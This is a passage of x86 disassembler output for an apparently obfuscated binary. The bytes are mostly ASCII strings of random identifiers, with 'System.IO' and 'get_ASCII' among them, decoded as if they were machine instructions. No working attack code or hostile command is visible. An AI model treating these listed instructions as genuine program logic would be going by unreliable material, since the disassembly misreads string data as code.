  407b36:	75 66                	jne    0x407b9e
  407b38:	6f                   	outsl  %ds:(%esi),(%dx)
  407b39:	49                   	dec    %ecx
  407b3a:	51                   	push   %ecx
  407b3b:	65 56                	gs push %esi
  407b3d:	6a 62                	push   $0x62
  407b3f:	46                   	inc    %esi
  407b40:	56                   	push   %esi
  407b41:	48                   	dec    %eax
  407b42:	00 70 50             	add    %dh,0x50(%eax)
  407b45:	50                   	push   %eax
  407b46:	6b 77 54 54          	imul   $0x54,0x54(%edi),%esi
  407b4a:	49                   	dec    %ecx
  407b4b:	47                   	inc    %edi
  407b4c:	69 5a 48 00 72 4a 65 	imul   $0x654a7200,0x48(%edx),%ebx
  407b53:	75 57                	jne    0x407bac
  407b55:	4f                   	dec    %edi
  407b56:	6d                   	insl   (%dx),%es:(%edi)
  407b57:	69 6a 5a 48 00 48 41 	imul   $0x41480048,0x5a(%edx),%ebp
  407b5e:	53                   	push   %ebx
  407b5f:	67 6d                	insl   (%dx),%es:(%di)
  407b61:	53                   	push   %ebx
  407b62:	45                   	inc    %ebp
  407b63:	46                   	inc    %esi
  407b64:	66 76 66             	data16 jbe 0x407bcd
  407b67:	48                   	dec    %eax
  407b68:	00 62 4f             	add    %ah,0x4f(%edx)
  407b6b:	42                   	inc    %edx
  407b6c:	4f                   	dec    %edi
  407b6d:	72 52                	jb     0x407bc1
  407b6f:	65 58                	gs pop %eax
  407b71:	50                   	push   %eax
  407b72:	67 48                	addr16 dec %eax
  407b74:	00 7a 75             	add    %bh,0x75(%edx)
  407b77:	77 6b                	ja     0x407be4
  407b79:	44                   	inc    %esp
  407b7a:	79 55                	jns    0x407bd1
  407b7c:	4f                   	dec    %edi
  407b7d:	58                   	pop    %eax
  407b7e:	73 44                	jae    0x407bc4
  407b80:	6b 48 00 71          	imul   $0x71,0x0(%eax),%ecx
  407b84:	6d                   	insl   (%dx),%es:(%edi)
  407b85:	69 5a 78 62 75 76 45 	imul   $0x45767562,0x78(%edx),%ebx
  407b8c:	52                   	push   %edx
  407b8d:	4d                   	dec    %ebp
  407b8e:	65 52                	gs push %edx
  407b90:	7a 6d                	jp     0x407bff
  407b92:	48                   	dec    %eax
  407b93:	00 52 63             	add    %dl,0x63(%edx)
  407b96:	79 6e                	jns    0x407c06
  407b98:	6b 50 44 53          	imul   $0x53,0x44(%eax),%edx
  407b9c:	47                   	inc    %edi
  407b9d:	6a 69                	push   $0x69
  407b9f:	79 75                	jns    0x407c16
  407ba1:	6e                   	outsb  %ds:(%esi),(%dx)
  407ba2:	48                   	dec    %eax
  407ba3:	00 4f 61             	add    %cl,0x61(%edi)
  407ba6:	48                   	dec    %eax
  407ba7:	51                   	push   %ecx
  407ba8:	59                   	pop    %ecx
  407ba9:	76 42                	jbe    0x407bed
  407bab:	78 46                	js     0x407bf3
  407bad:	6f                   	outsl  %ds:(%esi),(%dx)
  407bae:	42                   	inc    %edx
  407baf:	49                   	dec    %ecx
  407bb0:	00 67 65             	add    %ah,0x65(%edi)
  407bb3:	74 5f                	je     0x407c14
  407bb5:	41                   	inc    %ecx
  407bb6:	53                   	push   %ebx
  407bb7:	43                   	inc    %ebx
  407bb8:	49                   	dec    %ecx
  407bb9:	49                   	dec    %ecx
  407bba:	00 6c 54 78          	add    %ch,0x78(%esp,%edx,2)
  407bbe:	56                   	push   %esi
  407bbf:	4c                   	dec    %esp
  407bc0:	46                   	inc    %esi
  407bc1:	6a 50                	push   $0x50
  407bc3:	66 43                	inc    %bx
  407bc5:	4e                   	dec    %esi
  407bc6:	49                   	dec    %ecx
  407bc7:	00 75 71             	add    %dh,0x71(%ebp)
  407bca:	75 53                	jne    0x407c1f
  407bcc:	4c                   	dec    %esp
  407bcd:	47                   	inc    %edi
  407bce:	6a 48                	push   $0x48
  407bd0:	45                   	inc    %ebp
  407bd1:	43                   	inc    %ebx
  407bd2:	68 57 49 00 67       	push   $0x67004957
  407bd7:	56                   	push   %esi
  407bd8:	6c                   	insb   (%dx),%es:(%edi)
  407bd9:	69 55 73 45 6c 4c 6f 	imul   $0x6f4c6c45,0x73(%ebp),%edx
  407be0:	4d                   	dec    %ebp
  407be1:	77 68                	ja     0x407c4b
  407be3:	49                   	dec    %ecx
  407be4:	00 72 41             	add    %dh,0x41(%edx)
  407be7:	55                   	push   %ebp
  407be8:	45                   	inc    %ebp
  407be9:	43                   	inc    %ebx
  407bea:	68 41 73 65 6e       	push   $0x6e657341
  407bef:	49                   	dec    %ecx
  407bf0:	00 78 7a             	add    %bh,0x7a(%eax)
  407bf3:	4b                   	dec    %ebx
  407bf4:	78 52                	js     0x407c48
  407bf6:	6a 79                	push   $0x79
  407bf8:	5a                   	pop    %edx
  407bf9:	52                   	push   %edx
  407bfa:	77 49                	ja     0x407c45
  407bfc:	00 78 4c             	add    %bh,0x4c(%eax)
  407bff:	5a                   	pop    %edx
  407c00:	62 44 50 4c          	bound  %eax,0x4c(%eax,%edx,2)
  407c04:	6e                   	outsb  %ds:(%esi),(%dx)
  407c05:	55                   	push   %ebp
  407c06:	45                   	inc    %ebp
  407c07:	4a                   	dec    %edx
  407c08:	00 50 68             	add    %dl,0x68(%eax)
  407c0b:	45                   	inc    %ebp
  407c0c:	52                   	push   %edx
  407c0d:	68 43 76 63 53       	push   $0x53637643
  407c12:	47                   	inc    %edi
  407c13:	4a                   	dec    %edx
  407c14:	00 47 68             	add    %al,0x68(%edi)
  407c17:	6f                   	outsl  %ds:(%esi),(%dx)
  407c18:	65 63 42 4f          	arpl   %eax,%gs:0x4f(%edx)
  407c1c:	6f                   	outsl  %ds:(%esi),(%dx)
  407c1d:	76 63                	jbe    0x407c82
  407c1f:	49                   	dec    %ecx
  407c20:	4a                   	dec    %edx
  407c21:	00 57 6f             	add    %dl,0x6f(%edi)
  407c24:	42                   	inc    %edx
  407c25:	49                   	dec    %ecx
  407c26:	63 74 71 49          	arpl   %esi,0x49(%ecx,%esi,2)
  407c2a:	77 48                	ja     0x407c74
  407c2c:	6d                   	insl   (%dx),%es:(%edi)
  407c2d:	62 4a 00             	bound  %ecx,0x0(%edx)
  407c30:	68 48 41 57 50       	push   $0x50574148
  407c35:	4b                   	dec    %ebx
  407c36:	46                   	inc    %esi
  407c37:	59                   	pop    %ecx
  407c38:	78 53                	js     0x407c8d
  407c3a:	68 4a 00 68 48       	push   $0x4868004a
  407c3f:	4e                   	dec    %esi
  407c40:	76 41                	jbe    0x407c83
  407c42:	6b 47 58 4e          	imul   $0x4e,0x58(%edi),%eax
  407c46:	79 71                	jns    0x407cb9
  407c48:	4a                   	dec    %edx
  407c49:	00 6b 61             	add    %ch,0x61(%ebx)
  407c4c:	6d                   	insl   (%dx),%es:(%edi)
  407c4d:	47                   	inc    %edi
  407c4e:	4d                   	dec    %ebp
  407c4f:	59                   	pop    %ecx
  407c50:	67 61                	addr16 popa
  407c52:	66 68 41 55          	pushw  $0x5541
  407c56:	72 4a                	jb     0x407ca2
  407c58:	00 53 58             	add    %dl,0x58(%ebx)
  407c5b:	41                   	inc    %ecx
  407c5c:	73 69                	jae    0x407cc7
  407c5e:	61                   	popa
  407c5f:	65 71 5a             	gs jno 0x407cbc
  407c62:	57                   	push   %edi
  407c63:	74 4a                	je     0x407caf
  407c65:	00 71 75             	add    %dh,0x75(%ecx)
  407c68:	66 6c                	data16 insb (%dx),%es:(%edi)
  407c6a:	54                   	push   %esp
  407c6b:	6b 6c 58 4d 77       	imul   $0x77,0x4d(%eax,%ebx,2),%ebp
  407c70:	4b                   	dec    %ebx
  407c71:	75 4a                	jne    0x407cbd
  407c73:	00 66 78             	add    %ah,0x78(%esi)
  407c76:	62 79 4d             	bound  %edi,0x4d(%ecx)
  407c79:	6d                   	insl   (%dx),%es:(%edi)
  407c7a:	61                   	popa
  407c7b:	76 4e                	jbe    0x407ccb
  407c7d:	69 58 44 4b 00 61 78 	imul   $0x7861004b,0x44(%eax),%ebx
  407c84:	6f                   	outsl  %ds:(%esi),(%dx)
  407c85:	48                   	dec    %eax
  407c86:	77 55                	ja     0x407cdd
  407c88:	48                   	dec    %eax
  407c89:	55                   	push   %ebp
  407c8a:	62 55 45             	bound  %edx,0x45(%ebp)
  407c8d:	4b                   	dec    %ebx
  407c8e:	00 45 63             	add    %al,0x63(%ebp)
  407c91:	76 78                	jbe    0x407d0b
  407c93:	41                   	inc    %ecx
  407c94:	77 76                	ja     0x407d0c
  407c96:	4c                   	dec    %esp
  407c97:	6e                   	outsb  %ds:(%esi),(%dx)
  407c98:	76 73                	jbe    0x407d0d
  407c9a:	4b                   	dec    %ebx
  407c9b:	66 48                	dec    %ax
  407c9d:	4b                   	dec    %ebx
  407c9e:	00 50 45             	add    %dl,0x45(%eax)
  407ca1:	42                   	inc    %edx
  407ca2:	45                   	inc    %ebp
  407ca3:	57                   	push   %edi
  407ca4:	42                   	inc    %edx
  407ca5:	4a                   	dec    %edx
  407ca6:	4c                   	dec    %esp
  407ca7:	58                   	pop    %eax
  407ca8:	4f                   	dec    %edi
  407ca9:	4d                   	dec    %ebp
  407caa:	4a                   	dec    %edx
  407cab:	4b                   	dec    %ebx
  407cac:	00 74 76 4d          	add    %dh,0x4d(%esi,%esi,2)
  407cb0:	6f                   	outsl  %ds:(%esi),(%dx)
  407cb1:	52                   	push   %edx
  407cb2:	6f                   	outsl  %ds:(%esi),(%dx)
  407cb3:	66 6d                	insw   (%dx),%es:(%edi)
  407cb5:	4c                   	dec    %esp
  407cb6:	43                   	inc    %ebx
  407cb7:	65 4b                	gs dec %ebx
  407cb9:	00 72 51             	add    %dh,0x51(%edx)
  407cbc:	68 59 75 4d 55       	push   $0x554d7559
  407cc1:	73 4e                	jae    0x407d11
  407cc3:	65 66 4b             	gs dec %bx
  407cc6:	00 50 59             	add    %dl,0x59(%eax)
  407cc9:	56                   	push   %esi
  407cca:	6c                   	insb   (%dx),%es:(%edi)
  407ccb:	63 6f 4e             	arpl   %ebp,0x4e(%edi)
  407cce:	42                   	inc    %edx
  407ccf:	70 7a                	jo     0x407d4b
  407cd1:	5a                   	pop    %edx
  407cd2:	6c                   	insb   (%dx),%es:(%edi)
  407cd3:	4b                   	dec    %ebx
  407cd4:	00 58 46             	add    %bl,0x46(%eax)
  407cd7:	76 4d                	jbe    0x407d26
  407cd9:	65 46                	gs inc %esi
  407cdb:	76 73                	jbe    0x407d50
  407cdd:	6c                   	insb   (%dx),%es:(%edi)
  407cde:	54                   	push   %esp
  407cdf:	4e                   	dec    %esi
  407ce0:	44                   	inc    %esp
  407ce1:	6e                   	outsb  %ds:(%esi),(%dx)
  407ce2:	4b                   	dec    %ebx
  407ce3:	00 51 4c             	add    %dl,0x4c(%ecx)
  407ce6:	57                   	push   %edi
  407ce7:	64 76 43             	fs jbe 0x407d2d
  407cea:	4e                   	dec    %esi
  407ceb:	5a                   	pop    %edx
  407cec:	4b                   	dec    %ebx
  407ced:	74 44                	je     0x407d33
  407cef:	76 4b                	jbe    0x407d3c
  407cf1:	00 65 6e             	add    %ah,0x6e(%ebp)
  407cf4:	5a                   	pop    %edx
  407cf5:	5a                   	pop    %edx
  407cf6:	5a                   	pop    %edx
  407cf7:	50                   	push   %eax
  407cf8:	69 55 5a 67 41 4c 00 	imul   $0x4c4167,0x5a(%ebp),%edx
  407cff:	44                   	inc    %esp
  407d00:	69 6a 78 78 74 50 56 	imul   $0x56507478,0x78(%edx),%ebp
  407d07:	48                   	dec    %eax
  407d08:	45                   	inc    %ebp
  407d09:	54                   	push   %esp
  407d0a:	47                   	inc    %edi
  407d0b:	44                   	inc    %esp
  407d0c:	4c                   	dec    %esp
  407d0d:	00 70 56             	add    %dh,0x56(%eax)
  407d10:	4f                   	dec    %edi
  407d11:	49                   	dec    %ecx
  407d12:	62 4c 4c 54          	bound  %ecx,0x54(%esp,%ecx,2)
  407d16:	6e                   	outsb  %ds:(%esi),(%dx)
  407d17:	55                   	push   %ebp
  407d18:	79 61                	jns    0x407d7b
  407d1a:	44                   	inc    %esp
  407d1b:	4c                   	dec    %esp
  407d1c:	00 57 42             	add    %dl,0x42(%edi)
  407d1f:	4d                   	dec    %ebp
  407d20:	71 74                	jno    0x407d96
  407d22:	76 75                	jbe    0x407d99
  407d24:	53                   	push   %ebx
  407d25:	58                   	pop    %eax
  407d26:	51                   	push   %ecx
  407d27:	49                   	dec    %ecx
  407d28:	4c                   	dec    %esp
  407d29:	00 45 62             	add    %al,0x62(%ebp)
  407d2c:	58                   	pop    %eax
  407d2d:	65 6c                	gs insb (%dx),%es:(%edi)
  407d2f:	72 6b                	jb     0x407d9c
  407d31:	78 77                	js     0x407daa
  407d33:	70 64                	jo     0x407d99
  407d35:	4c                   	dec    %esp
  407d36:	00 6f 57             	add    %ch,0x57(%edi)
  407d39:	4d                   	dec    %ebp
  407d3a:	79 6d                	jns    0x407da9
  407d3c:	53                   	push   %ebx
  407d3d:	42                   	inc    %edx
  407d3e:	72 6f                	jb     0x407daf
  407d40:	44                   	inc    %esp
  407d41:	57                   	push   %edi
  407d42:	70 4c                	jo     0x407d90
  407d44:	00 4d 48             	add    %cl,0x48(%ebp)
  407d47:	61                   	popa
  407d48:	53                   	push   %ebx
  407d49:	51                   	push   %ecx
  407d4a:	71 71                	jno    0x407dbd
  407d4c:	48                   	dec    %eax
  407d4d:	74 69                	je     0x407db8
  407d4f:	5a                   	pop    %edx
  407d50:	4d                   	dec    %ebp
  407d51:	00 71 79             	add    %dh,0x79(%ecx)
  407d54:	63 69 64             	arpl   %ebp,0x64(%ecx)
  407d57:	74 4c                	je     0x407da5
  407d59:	76 68                	jbe    0x407dc3
  407d5b:	4d                   	dec    %ebp
  407d5c:	00 45 58             	add    %al,0x58(%ebp)
  407d5f:	74 63                	je     0x407dc4
  407d61:	67 44                	addr16 inc %esp
  407d63:	6e                   	outsb  %ds:(%esi),(%dx)
  407d64:	67 4f                	addr16 dec %edi
  407d66:	6f                   	outsl  %ds:(%esi),(%dx)
  407d67:	4d                   	dec    %ebp
  407d68:	00 66 78             	add    %ah,0x78(%esi)
  407d6b:	67 41                	addr16 inc %ecx
  407d6d:	52                   	push   %edx
  407d6e:	6b 41 6f 6d          	imul   $0x6d,0x6f(%ecx),%eax
  407d72:	75 76                	jne    0x407dea
  407d74:	43                   	inc    %ebx
  407d75:	42                   	inc    %edx
  407d76:	4e                   	dec    %esi
  407d77:	00 48 4f             	add    %cl,0x4f(%eax)
  407d7a:	56                   	push   %esi
  407d7b:	4e                   	dec    %esi
  407d7c:	47                   	inc    %edi
  407d7d:	69 75 72 74 63 49 43 	imul   $0x43496374,0x72(%ebp),%esi
  407d84:	4e                   	dec    %esi
  407d85:	00 43 55             	add    %al,0x55(%ebx)
  407d88:	49                   	dec    %ecx
  407d89:	63 47 65             	arpl   %eax,0x65(%edi)
  407d8c:	78 42                	js     0x407dd0
  407d8e:	4c                   	dec    %esp
  407d8f:	4b                   	dec    %ebx
  407d90:	43                   	inc    %ebx
  407d91:	4e                   	dec    %esi
  407d92:	00 75 50             	add    %dh,0x50(%ebp)
  407d95:	48                   	dec    %eax
  407d96:	7a 7a                	jp     0x407e12
  407d98:	75 6b                	jne    0x407e05
  407d9a:	75 4d                	jne    0x407de9
  407d9c:	6d                   	insl   (%dx),%es:(%edi)
  407d9d:	57                   	push   %edi
  407d9e:	56                   	push   %esi
  407d9f:	4e                   	dec    %esi
  407da0:	00 4b 61             	add    %cl,0x61(%ebx)
  407da3:	4d                   	dec    %ebp
  407da4:	78 56                	js     0x407dfc
  407da6:	44                   	inc    %esp
  407da7:	57                   	push   %edi
  407da8:	43                   	inc    %ebx
  407da9:	4d                   	dec    %ebp
  407daa:	52                   	push   %edx
  407dab:	71 5a                	jno    0x407e07
  407dad:	4e                   	dec    %esi
  407dae:	00 49 74             	add    %cl,0x74(%ecx)
  407db1:	6d                   	insl   (%dx),%es:(%edi)
  407db2:	45                   	inc    %ebp
  407db3:	69 49 48 78 7a 6a 58 	imul   $0x586a7a78,0x48(%ecx),%ecx
  407dba:	66 69 73 4e 00 69    	imul   $0x6900,0x4e(%ebx),%si
  407dc0:	4a                   	dec    %edx
  407dc1:	72 42                	jb     0x407e05
  407dc3:	46                   	inc    %esi
  407dc4:	59                   	pop    %ecx
  407dc5:	6c                   	insb   (%dx),%es:(%edi)
  407dc6:	4a                   	dec    %edx
  407dc7:	64 62 42 4f          	bound  %eax,%fs:0x4f(%edx)
  407dcb:	00 72 54             	add    %dh,0x54(%edx)
  407dce:	6a 53                	push   $0x53
  407dd0:	4d                   	dec    %ebp
  407dd1:	56                   	push   %esi
  407dd2:	69 6a 41 52 44 4f 00 	imul   $0x4f4452,0x41(%edx),%ebp
  407dd9:	53                   	push   %ebx
  407dda:	79 73                	jns    0x407e4f
  407ddc:	74 65                	je     0x407e43
  407dde:	6d                   	insl   (%dx),%es:(%edi)
  407ddf:	2e 49                	cs dec %ecx
  407de1:	4f                   	dec    %edi
  407de2:	00 7a 56             	add    %bh,0x56(%edx)
  407de5:	68 72 51 50 49       	push   $0x49505172
  407dea:	5a                   	pop    %edx
  407deb:	55                   	push   %ebp
  407dec:	4f                   	dec    %edi
  407ded:	00 5a 4a             	add    %bl,0x4a(%edx)
  407df0:	54                   	push   %esp
  407df1:	4a                   	dec    %edx
  407df2:	4b                   	dec    %ebx
  407df3:	41                   	inc    %ecx
  407df4:	66 6c                	data16 insb (%dx),%es:(%edi)
  407df6:	6d                   	insl   (%dx),%es:(%edi)
  407df7:	57                   	push   %edi
  407df8:	4f                   	dec    %edi
  407df9:	00 42 48             	add    %al,0x48(%edx)
  407dfc:	69 6d 72 73 4c 7a 4a 	imul   $0x4a7a4c73,0x72(%ebp),%ebp
  407e03:	46                   	inc    %esi
  407e04:	6a 67                	push   $0x67
  407e06:	4f                   	dec    %edi
  407e07:	00 59 77             	add    %bl,0x77(%ecx)
  407e0a:	75 56                	jne    0x407e62
  407e0c:	65 79 78             	gs jns 0x407e87
  407e0f:	72 62                	jb     0x407e73
  407e11:	6c                   	insb   (%dx),%es:(%edi)
  407e12:	47                   	inc    %edi
  407e13:	79 77                	jns    0x407e8c
  407e15:	4b                   	dec    %ebx
  407e16:	50                   	push   %eax
  407e17:	00 6b 72             	add    %ch,0x72(%ebx)
  407e1a:	67 70 45             	addr16 jo 0x407e62
  407e1d:	79 45                	jns    0x407e64
  407e1f:	79 4b                	jns    0x407e6c
  407e21:	54                   	push   %esp
  407e22:	4c                   	dec    %esp
  407e23:	50                   	push   %eax
  407e24:	00 49 6a             	add    %cl,0x6a(%ecx)
  407e27:	69 61 66 69 67 64 46 	imul   $0x46646769,0x66(%ecx),%esp
  407e2e:	46                   	inc    %esi
  407e2f:	4e                   	dec    %esi
  407e30:	50                   	push   %eax
  407e31:	00 57 6e             	add    %dl,0x6e(%edi)
  407e34:	45                   	inc    %ebp
  407e35:	6d                   	insl   (%dx),%es:(%edi)
  407e36:	69 4e 47 6a 62 79 6e 	imul   $0x6e79626a,0x47(%esi),%ecx
  407e3d:	7a 64                	jp     0x407ea3
  407e3f:	63 58 50             	arpl   %ebx,0x50(%eax)
  407e42:	50                   	push   %eax
  407e43:	00 66 6f             	add    %ah,0x6f(%esi)
  407e46:	71 69                	jno    0x407eb1
  407e48:	4f                   	dec    %edi
  407e49:	4a                   	dec    %edx
  407e4a:	46                   	inc    %esi
  407e4b:	6d                   	insl   (%dx),%es:(%edi)
  407e4c:	41                   	inc    %ecx
  407e4d:	58                   	pop    %eax
  407e4e:	62 70 4d             	bound  %esi,0x4d(%eax)
  407e51:	55                   	push   %ebp
  407e52:	50                   	push   %eax
  407e53:	00 43 79             	add    %al,0x79(%ebx)
  407e56:	65 72 66             	gs jb  0x407ebf
  407e59:	70 75                	jo     0x407ed0
  407e5b:	48                   	dec    %eax
  407e5c:	54                   	push   %esp
  407e5d:	65 57                	gs push %edi
  407e5f:	50                   	push   %eax
  407e60:	00 45 4b             	add    %al,0x4b(%ebp)
  407e63:	64 59                	fs pop %ecx
  407e65:	4f                   	dec    %edi
  407e66:	4d                   	dec    %ebp
  407e67:	42                   	inc    %edx
  407e68:	41                   	inc    %ecx
  407e69:	78 52                	js     0x407ebd
  407e6b:	47                   	inc    %edi
  407e6c:	42                   	inc    %edx
  407e6d:	63 50 00             	arpl   %edx,0x0(%eax)
  407e70:	58                   	pop    %eax
  407e71:	58                   	pop    %eax
  407e72:	4a                   	dec    %edx
  407e73:	6e                   	outsb  %ds:(%esi),(%dx)
  407e74:	41                   	inc    %ecx
  407e75:	7a 4c                	jp     0x407ec3
  407e77:	4a                   	dec    %edx
  407e78:	56                   	push   %esi
  407e79:	63 50 00             	arpl   %edx,0x0(%eax)
  407e7c:	4f                   	dec    %edi
  407e7d:	76 4d                	jbe    0x407ecc
  407e7f:	4d                   	dec    %ebp
  407e80:	4b                   	dec    %ebx
  407e81:	62 6c 56 70          	bound  %ebp,0x70(%esi,%edx,2)
  407e85:	72 72                	jb     0x407ef9
  407e87:	50                   	push   %eax
  407e88:	00 6b 59             	add    %ch,0x59(%ebx)
  407e8b:	74 64                	je     0x407ef1
  407e8d:	6e                   	outsb  %ds:(%esi),(%dx)
  407e8e:	76 67                	jbe    0x407ef7
  407e90:	71 44                	jno    0x407ed6
  407e92:	73 73                	jae    0x407f07
  407e94:	50                   	push   %eax
  407e95:	00 77 45             	add    %dh,0x45(%edi)
  407e98:	75 4a                	jne    0x407ee4
  407e9a:	70 53                	jo     0x407eef
  407e9c:	69 6f 4d 76 43 48 79 	imul   $0x79484376,0x4d(%edi),%ebp
  407ea3:	7a 50                	jp     0x407ef5
  407ea5:	00 6c 7a 78          	add    %ch,0x78(%edx,%edi,2)
  407ea9:	4a                   	dec    %edx
  407eaa:	44                   	inc    %esp
  407eab:	75 62                	jne    0x407f0f
  407ead:	63 5a 4f             	arpl   %ebx,0x4f(%edx)
  407eb0:	51                   	push   %ecx
  407eb1:	00 63 57             	add    %ah,0x57(%ebx)
  407eb4:	70 48                	jo     0x407efe
  407eb6:	55                   	push   %ebp
  407eb7:	47                   	inc    %edi
  407eb8:	6c                   	insb   (%dx),%es:(%edi)
  407eb9:	4f                   	dec    %edi
  407eba:	58                   	pop    %eax
  407ebb:	59                   	pop    %ecx
  407ebc:	45                   	inc    %ebp
  407ebd:	65 51                	gs push %ecx
  407ebf:	00 51 41             	add    %dl,0x41(%ecx)
  407ec2:	61                   	popa
  407ec3:	55                   	push   %ebp
  407ec4:	73 53                	jae    0x407f19
  407ec6:	47                   	inc    %edi
  407ec7:	70 65                	jo     0x407f2e
  407ec9:	51                   	push   %ecx
  407eca:	00 70 6e             	add    %dh,0x6e(%eax)
  407ecd:	50                   	push   %eax
  407ece:	76 6d                	jbe    0x407f3d
  407ed0:	64 64 52             	fs fs push %edx
  407ed3:	72 44                	jb     0x407f19
  407ed5:	77 42                	ja     0x407f19
  407ed7:	41                   	inc    %ecx
  407ed8:	67 51                	addr16 push %ecx
  407eda:	00 59 71             	add    %bl,0x71(%ecx)
  407edd:	51                   	push   %ecx
  407ede:	69 45 7a 46 59 54 74 	imul   $0x74545946,0x7a(%ebp),%eax
  407ee5:	51                   	push   %ecx
  407ee6:	00 49 56             	add    %cl,0x56(%ecx)
  407ee9:	6f                   	outsl  %ds:(%esi),(%dx)
  407eea:	6c                   	insb   (%dx),%es:(%edi)
  407eeb:	74 55                	je     0x407f42
  407eed:	6f                   	outsl  %ds:(%esi),(%dx)
  407eee:	6e                   	outsb  %ds:(%esi),(%dx)
  407eef:	50                   	push   %eax
  407ef0:	52                   	push   %edx
  407ef1:	00 43 55             	add    %al,0x55(%ebx)
  407ef4:	57                   	push   %edi
  407ef5:	64 54                	fs push %esp
  407ef7:	64 70 6a             	fs jo  0x407f64
  407efa:	62 6b 53             	bound  %ebp,0x53(%ebx)
  407efd:	52                   	push   %edx
  407efe:	00 42 4e             	add    %al,0x4e(%edx)
  407f01:	57                   	push   %edi
  407f02:	57                   	push   %edi
  407f03:	6d                   	insl   (%dx),%es:(%edi)
  407f04:	75 5a                	jne    0x407f60
  407f06:	71 63                	jno    0x407f6b
  407f08:	4a                   	dec    %edx
  407f09:	54                   	push   %esp
  407f0a:	52                   	push   %edx
  407f0b:	00 47 78             	add    %al,0x78(%edi)
  407f0e:	4f                   	dec    %edi
  407f0f:	75 58                	jne    0x407f69
  407f11:	6d                   	insl   (%dx),%es:(%edi)
  407f12:	77 77                	ja     0x407f8b
  407f14:	4a                   	dec    %edx
  407f15:	54                   	push   %esp
  407f16:	6b 52 00 62          	imul   $0x62,0x0(%edx),%edx
  407f1a:	4a                   	dec    %edx
  407f1b:	50                   	push   %eax
  407f1c:	48                   	dec    %eax
  407f1d:	61                   	popa
  407f1e:	7a 56                	jp     0x407f76
  407f20:	65 45                	gs inc %ebp
  407f22:	59                   	pop    %ecx
  407f23:	72 52                	jb     0x407f77
  407f25:	00 74 42 4c          	add    %dh,0x4c(%edx,%eax,2)
  407f29:	4e                   	dec    %esi
  407f2a:	61                   	popa
  407f2b:	65 44                	gs inc %esp
  407f2d:	72 68                	jb     0x407f97
  407f2f:	49                   	dec    %ecx
  407f30:	70 77                	jo     0x407fa9
  407f32:	52                   	push   %edx
  407f33:	00 57 6f             	add    %dl,0x6f(%edi)
  407f36:	43                   	inc    %ebx
  407f37:	78 65                	js     0x407f9e
  407f39:	57                   	push   %edi
  407f3a:	57                   	push   %edi
  407f3b:	5a                   	pop    %edx
  407f3c:	64 65 4f             	fs gs dec %edi
  407f3f:	53                   	push   %ebx
  407f40:	49                   	dec    %ecx
  407f41:	7a 52                	jp     0x407f95
  407f43:	00 4c 6f 6a          	add    %cl,0x6a(%edi,%ebp,2)
  407f47:	42                   	inc    %edx
  407f48:	64 69 68 6f 43 4f 45 	imul   $0x53454f43,%fs:0x6f(%eax),%ebp
  407f4f:	53 
  407f50:	00 4f 62             	add    %cl,0x62(%edi)
  407f53:	74 46                	je     0x407f9b
  407f55:	74 71                	je     0x407fc8
  407f57:	4b                   	dec    %ebx
  407f58:	48                   	dec    %eax
  407f59:	4e                   	dec    %esi
  407f5a:	43                   	inc    %ebx
  407f5b:	54                   	push   %esp
  407f5c:	53                   	push   %ebx
  407f5d:	00 72 7a             	add    %dh,0x7a(%edx)
  407f60:	49                   	dec    %ecx
  407f61:	4b                   	dec    %ebx
  407f62:	6d                   	insl   (%dx),%es:(%edi)
  407f63:	61                   	popa
  407f64:	6d                   	insl   (%dx),%es:(%edi)
  407f65:	42                   	inc    %edx
  407f66:	68 53 00 42 55       	push   $0x55420053
  407f6b:	75 43                	jne    0x407fb0
  407f6d:	4d                   	dec    %ebp
  407f6e:	66 50                	push   %ax
  407f70:	6b 5a 70 6d          	imul   $0x6d,0x70(%edx),%ebx
  407f74:	53                   	push   %ebx
  407f75:	00 42 6a             	add    %al,0x6a(%edx)
  407f78:	69 50 76 76 53 46 43 	imul   $0x43465376,0x76(%eax),%edx
  407f7f:	54                   	push   %esp
  407f80:	00 61 6b             	add    %ah,0x6b(%ecx)
  407f83:	5a                   	pop    %edx
  407f84:	41                   	inc    %ecx
  407f85:	5a                   	pop    %edx
  407f86:	5a                   	pop    %edx
  407f87:	79 4b                	jns    0x407fd4
  407f89:	66 68 57 47          	pushw  $0x4757
  407f8d:	54                   	push   %esp
  407f8e:	00 70 77             	add    %dh,0x77(%eax)
  407f91:	6a 72                	push   $0x72
  407f93:	63 75 70             	arpl   %esi,0x70(%ebp)
  407f96:	75 4c                	jne    0x407fe4
  407f98:	54                   	push   %esp
  407f99:	00 66 46             	add    %ah,0x46(%esi)
  407f9c:	46                   	inc    %esi
  407f9d:	68 56 6f 43 6f       	push   $0x6f436f56
  407fa2:	51                   	push   %ecx
  407fa3:	54                   	push   %esp
  407fa4:	73 67                	jae    0x40800d
  407fa6:	62 54 00 47          	bound  %edx,0x47(%eax,%eax,1)
  407faa:	56                   	push   %esi
  407fab:	68 68 50 5a 4a       	push   $0x4a5a5068
  407fb0:	4e                   	dec    %esi
  407fb1:	42                   	inc    %edx
  407fb2:	71 65                	jno    0x408019
  407fb4:	54                   	push   %esp
  407fb5:	00 6b 78             	add    %ch,0x78(%ebx)
  407fb8:	6b 6d 79 6b          	imul   $0x6b,0x79(%ebp),%ebp
  407fbc:	50                   	push   %eax
  407fbd:	53                   	push   %ebx
  407fbe:	77 55                	ja     0x408015
  407fc0:	57                   	push   %edi
  407fc1:	73 6a                	jae    0x40802d
  407fc3:	54                   	push   %esp
  407fc4:	00 56 6f             	add    %dl,0x6f(%esi)
  407fc7:	69 4a 56 76 7a 6d 7a 	imul   $0x7a6d7a76,0x56(%edx),%ecx
  407fce:	74 76                	je     0x408046
  407fd0:	7a 67                	jp     0x408039
  407fd2:	72 54                	jb     0x408028
  407fd4:	00 6d 63             	add    %ch,0x63(%ebp)
  407fd7:	53                   	push   %ebx
  407fd8:	6c                   	insb   (%dx),%es:(%edi)
  407fd9:	47                   	inc    %edi
  407fda:	53                   	push   %ebx
  407fdb:	64 6b 41 77 5a       	imul   $0x5a,%fs:0x77(%ecx),%eax
  407fe0:	50                   	push   %eax
  407fe1:	55                   	push   %ebp
  407fe2:	00 6b 6f             	add    %ch,0x6f(%ebx)
  407fe5:	54                   	push   %esp
  407fe6:	75 5a                	jne    0x408042
  407fe8:	42                   	inc    %edx
  407fe9:	4e                   	dec    %esi
  407fea:	64 76 48             	fs jbe 0x408035
  407fed:	6b 6a 69 7a          	imul   $0x7a,0x69(%edx),%ebp
  407ff1:	46                   	inc    %esi
  407ff2:	63 52 55             	arpl   %edx,0x55(%edx)
  407ff5:	00 63 57             	add    %ah,0x57(%ebx)
  407ff8:	49                   	dec    %ecx
  407ff9:	75 4f                	jne    0x40804a
  407ffb:	56                   	push   %esi
  407ffc:	68 61 48 61 4e       	push   $0x4e614861
